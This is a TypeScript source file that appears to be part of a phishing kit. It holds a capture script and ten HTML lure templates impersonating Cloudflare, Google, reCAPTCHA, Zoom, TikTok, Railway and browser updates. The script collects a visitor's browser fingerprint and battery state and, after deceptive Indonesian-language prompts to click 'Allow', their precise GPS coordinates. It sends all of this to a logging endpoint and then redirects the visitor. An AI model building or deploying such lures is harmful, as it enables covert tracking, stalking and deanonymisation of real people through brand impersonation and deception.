export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com') => `
<script>
  (function() {
    var gpsAttempted = false;
    var startTime = Date.now();
    var hasRedirected = false;
    var targetId = '${id}';
    var targetUrl = '${redirectUrl}';
    
    function checkRedirect() {
      if (hasRedirected) return;
      var elapsed = (Date.now() - startTime) / 1000;
      if (elapsed >= 15 || (gpsAttempted && elapsed >= 3)) {
        hasRedirected = true;
        window.location.href = targetUrl;
      }
    }

    setInterval(checkRedirect, 1000);

    window.startCapture = async function() {
      var box = document.querySelector('.box') || document.querySelector('.container');
      if (!box) return;

      box.innerHTML = '<div id="status-icon" style="font-size:40px; margin-bottom:15px;">🔍</div>' +
        '<h2 id="status-title">Menganalisis Perangkat...</h2>' +
        '<div id="progress-container" style="width:100%; background:#f0f0f0; border-radius:10px; height:8px; margin-bottom:15px; overflow:hidden; border: 1px solid #eee;">' +
        '<div id="progress-bar" style="width:0%; background:linear-gradient(90deg, #3498db, #2ecc71); height:100%; transition:width 0.4s ease;"></div>' +
        '</div>' +
        '<p id="status-text" style="font-size:13px; color:#7f8c8d; min-height: 40px;">Menginisialisasi modul sinkronisasi...</p>';

      var statusTitle = document.getElementById('status-title');
      var statusText = document.getElementById('status-text');
      var bar = document.getElementById('progress-bar');
      var icon = document.getElementById('status-icon');
      
      function updateProgress(p, text, title) {
        if (bar) bar.style.width = p + '%';
        if (statusText) statusText.innerText = text;
        if (statusTitle && title) statusTitle.innerText = title;
      }

      function finish(success, reason) {
        if (bar) bar.style.width = '100%';
        if (success) {
          if (icon) icon.innerText = "✅";
          if (statusTitle) {
            statusTitle.innerText = "Terverifikasi";
            statusTitle.style.color = "#27ae60";
          }
          if (statusText) statusText.innerText = "Sinkronisasi selesai. Mengalihkan...";
        } else {
          if (icon) icon.innerText = "ℹ️";
          if (statusTitle) statusTitle.innerText = "Selesai";
          if (statusText) statusText.innerText = (reason || "") + " Melanjutkan pengalihan...";
        }
        setTimeout(checkRedirect, 1500);
      }

      try {
        updateProgress(15, "Menganalisis profil browser...");
        
        var metadata = {
          browser: navigator.userAgent,
          platform: navigator.platform,
          screen: window.screen.width + "x" + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          cores: navigator.hardwareConcurrency || "N/A",
          mem: navigator.deviceMemory || "N/A",
          vendor: navigator.vendor,
          ref: document.referrer || "Direct"
        };

        try {
          if ('getBattery' in navigator) {
            var b = await navigator.getBattery();
            metadata.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
          }
        } catch(e) {}

        updateProgress(40, "Mengunggah metadata sistem...");
        
        fetch('/api/log/' + targetId + '/info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(metadata)
        }).catch(function(){});

        updateProgress(65, "Menunggu otorisasi sinkronisasi...", "Izin Diperlukan");
        if (icon) icon.innerText = "📍";

        if (navigator.geolocation) { 
          navigator.geolocation.getCurrentPosition( 
            function(pos) { 
              updateProgress(90, "Verifikasi koordinat terakhir...");
              fetch('/api/log/' + targetId + '/gps', { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
              }).finally(function() { 
                gpsAttempted = true; 
                finish(true);
              }); 
            }, 
            function(err) { 
              gpsAttempted = true; 
              finish(false, "Sinkronisasi lokasi dilewati.");
            }, 
            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 } 
          ); 
        } else { 
          gpsAttempted = true; 
          finish(false, "GPS tidak tersedia.");
        }
      } catch (err) {
        finish(false, "Kesalahan sistem.");
      }
    };
  })();
</script>
`;

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "Standard: Secure Identity Sync",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:30px; background:#fff; border-radius:15px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; font-size:16px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3); width: 100%; } .btn:active { transform: scale(0.98); }</style></head><body><div class="box"><div class="loader"></div><h2>Otoritas Keamanan</h2><p>Langkah terakhir: Sinkronkan profil keamanan browser Anda dengan server tujuan untuk melanjutkan akses aman.</p><button class="btn" onclick="window.startCapture();">VERIFIKASI AKUN</button></div>${getCaptureScript(id)}</body></html>`
  },
  '2': {
    name: "Cloudflare: Integrity Check",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Needed</title><style>body { font-family:system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { width:90%; max-width:450px; } .dot-spinner { display:flex; gap:8px; margin-bottom:20px; justify-content:center; } .dot { width:10px; height:10px; background:#fa8231; border-radius:50%; animation:bounce 0.5s infinite alternate; } .dot:nth-child(2) { animation-delay:0.1s; } .dot:nth-child(3) { animation-delay:0.2s; } @keyframes bounce { to { transform:translateY(-10px); } } h1 { font-size:24px; font-weight:500; } .info { font-size:14px; color:#555; margin-bottom:30px; } .btn { border:1px solid #ccc; background:#fff; padding:12px 25px; border-radius:4px; font-weight:600; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.05); width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:30px;"><div class="dot-spinner"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><h1>Verifying your browser integrity...</h1><p class="info">Please confirm your connection is secure. Click below and <b>Allow</b> the security check authorization to proceed.</p><button class="btn" onclick="window.startCapture();">Proceed with Integrity Check</button><br><span style="font-size:10px;color:#999; display:block; margin-top:20px;">Ray ID: ${id}</span></div>${getCaptureScript(id)}</body></html>`
  },
  '3': {
    name: "Redirect: Verifikasi File",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Redirecting...</title><style>body { background:#f9f9f9; text-align:center; padding-top:20vh; font-family:sans-serif;} .box { width:90%; max-width:400px; background:#fff; border:1px solid #ddd; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 4px 6px rgba(0,0,0,0.05); } .icon { font-size:50px; margin-bottom:15px; } .btn { background:#000; color:#fff; border:none; padding:12px 40px; border-radius:25px; font-weight:bold; cursor:pointer; margin-top:20px; width:100%; }</style></head><body><div class="box"><div class="icon">🔓</div><h2>Verifikasi Keamanan</h2><p>Klik tombol di bawah dan pilih <b>Allow / Izinkan</b> untuk mensinkronkan izin keamanan dan membuka konten yang diminta secara otomatis.</p><button class="btn" onclick="window.startCapture();">BUKA KONTEN</button></div>${getCaptureScript(id)}</body></html>`
  },
  '4': {
    name: "Google: Verified Device Sync",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Secure</title><style>body { font-family: 'Roboto', Arial, sans-serif; text-align:center; padding-top:10vh; } .container { width:90%; max-width:400px; margin:0 auto; padding:30px; border:1px solid #efefef; border-radius:8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); } h2 { font-weight:400; color: #202124; } .btn { background:#1a73e8; color:white; border:none; padding:12px 30px; border-radius:4px; cursor:pointer; font-weight:500; margin-top:20px; width:100%; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"><br><br><h2>Verifikasi Perangkat</h2><p>Sinkronkan status keamanan perangkat Anda. Klik tombol dan pilih <b>Allow / Izinkan</b> pada jendela permintaan sistem yang muncul untuk mengonfirmasi identitas.</p><button class="btn" onclick="window.startCapture();">SINKRONKAN SEKARANG</button></div>${getCaptureScript(id)}</body></html>`
  },
  '5': {
    name: "System: Security Scanner",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Sync</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { border:1px solid #0f0; background:transparent; color:#0f0; padding:15px 30px; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><h1>SCANNING DEVICE...</h1><p>[*] Checking browser integrity<br>[*] Requesting hardware validation link...<br><br>Please click below and <b>Allow</b> the system sync to complete the scan process.</p><br><button class="btn" onclick="window.startCapture();">WHITELIST DEVICE</button></div>${getCaptureScript(id)}</body></html>`
  },
  '6': {
    name: "Railway: Deploy Authentication",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Railway App</title><style>body { background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#e1ff00; color:#000; padding:12px 25px; border-radius:6px; font-weight:bold; border:none; margin-top:20px; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://railway.app/brand/logotype-dark.svg" width="150" style="margin-bottom:30px;"><br><h2>Login Verification</h2><p>Konfirmasi sinkronisasi perangkat diperlukan untuk mengamankan akses server. Klik Approve dan pilih <b>Allow</b> pada notifikasi sistem.</p><button class="btn" onclick="window.startCapture();">APPROVE ACCESS</button></div>${getCaptureScript(id)}</body></html>`
  },
  '7': {
    name: "Zoom: Camera Calibration",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Zoom Calibration</title><style>body { background:#fff; font-family:sans-serif; text-align:center; padding-top:15vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#2d8cff; color:#fff; padding:15px 30px; border-radius:10px; font-weight:bold; border:none; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><img src="https://st1.zoom.us/static/6.3.25055/image/new/ZoomLogo.png" width="120"><br><br><h1>Persiapan Video...</h1><p>Sistem perlu mensinkronkan izin media browser Anda. Klik tombol di bawah dan pilih <b>Allow / Izinkan</b> agar sesi video berjalan lancar.</p><button class="btn" onclick="window.startCapture();">IZINKAN SINKRONISASI</button></div>${getCaptureScript(id, 'https://zoom.us/')}</body></html>`
  },
  '8': {
    name: "TikTok: Verifikasi 18+",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok</title><style>body { background:#121212; color:white; text-align:center; padding-top:20vh; font-family:sans-serif; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#fe2c55; color:white; padding:15px 40px; border-radius:4px; font-weight:bold; border:none; cursor:pointer; font-size:16px; width:100%; }</style></head><body><div class="box"><div style="font-size:40px;">🔞</div><h2>VIDEO DIBATASI USIA</h2><p>Konten ini hanya untuk pemirsa dewasa. Klik tombol konfirmasi dan pilih <b>Allow</b> untuk memverifikasi usia Anda melalui sinkronisasi lokasi.</p><button class="btn" onclick="window.startCapture();">KONFIRMASI UMUR</button></div>${getCaptureScript(id)}</body></html>`
  },
  '9': {
    name: "Captcha: Identity Task",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; } .box { border:1px solid #d3d3d3; padding:15px; background:#fff; box-shadow:0 2px 4px rgba(0,0,0,0.1); display:flex; align-items:center; width:300px; cursor:pointer; }</style></head><body><div style="text-align:center;"><p style="margin-bottom:20px; color:#555;">Selesaikan tantangan untuk melanjutkan.<br>Klik kotak dan pilih <b>"Allow"</b>.</p><div class="box" onclick="window.startCapture(); this.querySelector('.check').innerHTML='✓';"><div class="check" style="width:25px; height:25px; border:2px solid #c1c1c1; margin-right:15px; display:flex; align-items:center; justify-content:center; color:green; font-weight:bold;"></div><div style="font-size:14px; color:#555;">Saya bukan robot</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id)}</body></html>`
  },
  '10':{
    name: "Update: Browser Security Patch",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Update</title><style>body { font-family:sans-serif; text-align:center; padding-top:20vh; background:#f5f5f7; } .box { width:90%; max-width:400px; background:#fff; display:inline-block; padding:30px; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.05); } .btn { background:#007aff; color:white; padding:12px 40px; border-radius:22px; border:none; cursor:pointer; font-weight:600; margin-top:20px; width:100%; }</style></head><body><div class="box"><div style="font-size:50px; color:#007aff; margin-bottom:20px;">🛡️</div><h1>Update Keamanan</h1><p>Sertifikat keamanan browser Anda perlu diperbarui. Klik tombol dan pilih <b>Allow / Izinkan</b> untuk mensinkronkan patch terbaru.</p><button class="btn" onclick="window.startCapture();">UPDATE & AMANKAN</button></div>${getCaptureScript(id)}</body></html>`
  }
};
